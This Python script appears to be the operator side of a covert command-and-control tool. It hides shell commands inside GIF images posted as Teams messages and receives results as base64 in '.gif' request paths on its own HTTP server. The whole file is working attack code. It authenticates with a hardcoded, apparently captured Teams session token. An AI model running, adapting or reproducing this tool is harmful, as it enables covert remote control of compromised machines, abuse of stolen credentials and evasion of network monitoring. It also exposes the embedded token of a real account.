#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import base64
import threading
import requests
from base64 import b64decode, b64encode
command_history = []
class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
    def do_GET(self):
        self._set_response()
        if "gif" in self.path and self.path != "/.gif":
            if self.path not in command_history:
                command_history.append(self.path)
                s = self.path
                trimmed = s[:s.find('.gif')]
                trimmed = trimmed.replace("/", "")
                try:
                    trimmed = base64.b64decode(trimmed).decode("utf-8")
                    print(trimmed)
                    command_intake()
                except:
                    trimmed = base64.b64decode(trimmed + '=').decode("utf-8")
                    print(trimmed)
                    command_intake()
    def log_message(self, format, *args):
        return
def command_intake():
    val = input("> ")
    my_str = val
    my_str_as_bytes = str.encode("hello;" + my_str)
    with open("giphy2.gif", "rb") as f:
       original =  (f.read())
    test = ''
    original2 = original + my_str_as_bytes
    base64_gif_encoded = base64.b64encode(original2)
    base64_gif_encoded = base64_gif_encoded.decode()
    test = base64_gif_encoded
    burp0_url = "https://apac.ng.msg.teams.microsoft.com/v1/users/ME/conversations/19:a105c61a-b2d8-4461-88cb-6d970a87f08c_c3946828-97bf-4758-8c1d-f2316c032285@unq.gbl.spaces/messages"
    token = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjEwNiIsIng1dCI6Im9QMWFxQnlfR3hZU3pSaXhuQ25zdE5PU2p2cyIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2NjMwNjI2MDgsImV4cCI6MTY2MzEzNzcwMSwic2t5cGVpZCI6Im9yZ2lkOmExMDVjNjFhLWIyZDgtNDQ2MS04OGNiLTZkOTcwYTg3ZjA4YyIsInNjcCI6NzgwLCJjc2kiOiIxNjYzMDYyMzA3IiwidGlkIjoiNDUyMDJkZWUtNDA4OC00ZThjLThlYmQtYzAxZjU2NzQwZThmIiwicmduIjoiYXBhYyIsImRldmljZWlkIjoiNzMyYzhiMGQtM2MwMS00ZTQ3LTllNmUtYWRhOWE3M2NkOTk3In0.DySrmBi0dRBzWB9p6d2iRYhCBw5xh6tN8JSfGyBMrLccePju3NLlp7bbitRouU7csp_dXpofnaQ3M-OSifNy__gzDnMXBb2_Ot8FE1mRMC4SRJrFYKwkL5h0KogX9PG0ZwBqz43xMD2uEeWs-ILScZ-UBZ_Re2VKrvqT43wHT9NR9T_nmTLUQj6i-9zESl0ASCo09T_kJz1V6x7_wHW8k6qTrRxa10HlfcMmX4mtYyHc9QKGl3YFxJH3lpgThT7NEuapH4jafnkLBtIyHCv-oJ1bp4D4WAOLANrSyx4u_IhnVKRyeUAxRPunX2M8a-c6s9z_Ac6xkZutkllEfvoGTQ"
    burp0_headers = {"Authentication": "skypetoken="+token}
    burp0_json = {"content": "<p>paving<img alt=\"Red Lold\" src=\"data:image/png;base64, %s\" />roads</p>" %
                  (test), "contenttype": "text", "messagetype": "RichText/Html"}
    response = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
def send_start():
    my_str = "start"
    my_str_as_bytes = str.encode("hello;" + my_str)
    with open("giphy2.gif", "rb") as f:
       original =  (f.read())
    test = ''
    original2 = original + my_str_as_bytes
    base64_gif_encoded = base64.b64encode(original2)
    base64_gif_encoded = base64_gif_encoded.decode()
    test = base64_gif_encoded
    burp0_url = "https://apac.ng.msg.teams.microsoft.com/v1/users/ME/conversations/19:a105c61a-b2d8-4461-88cb-6d970a87f08c_c3946828-97bf-4758-8c1d-f2316c032285@unq.gbl.spaces/messages"
    token = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjEwNiIsIng1dCI6Im9QMWFxQnlfR3hZU3pSaXhuQ25zdE5PU2p2cyIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2NjMwNjI2MDgsImV4cCI6MTY2MzEzNzcwMSwic2t5cGVpZCI6Im9yZ2lkOmExMDVjNjFhLWIyZDgtNDQ2MS04OGNiLTZkOTcwYTg3ZjA4YyIsInNjcCI6NzgwLCJjc2kiOiIxNjYzMDYyMzA3IiwidGlkIjoiNDUyMDJkZWUtNDA4OC00ZThjLThlYmQtYzAxZjU2NzQwZThmIiwicmduIjoiYXBhYyIsImRldmljZWlkIjoiNzMyYzhiMGQtM2MwMS00ZTQ3LTllNmUtYWRhOWE3M2NkOTk3In0.DySrmBi0dRBzWB9p6d2iRYhCBw5xh6tN8JSfGyBMrLccePju3NLlp7bbitRouU7csp_dXpofnaQ3M-OSifNy__gzDnMXBb2_Ot8FE1mRMC4SRJrFYKwkL5h0KogX9PG0ZwBqz43xMD2uEeWs-ILScZ-UBZ_Re2VKrvqT43wHT9NR9T_nmTLUQj6i-9zESl0ASCo09T_kJz1V6x7_wHW8k6qTrRxa10HlfcMmX4mtYyHc9QKGl3YFxJH3lpgThT7NEuapH4jafnkLBtIyHCv-oJ1bp4D4WAOLANrSyx4u_IhnVKRyeUAxRPunX2M8a-c6s9z_Ac6xkZutkllEfvoGTQ"
    burp0_headers = {"Authentication": "skypetoken="+token}
    burp0_json = {"content": "<p>paving<img alt=\"Red Lold\" src=\"data:image/png;base64, %s\" />roads</p>" %
                  (test), "contenttype": "text", "messagetype": "RichText/Html"}
    response = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
def run(server_class=HTTPServer, handler_class=S, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    try:
        send_start()
        command_intake()
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')
if __name__ == '__main__':
    from sys import argv
    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
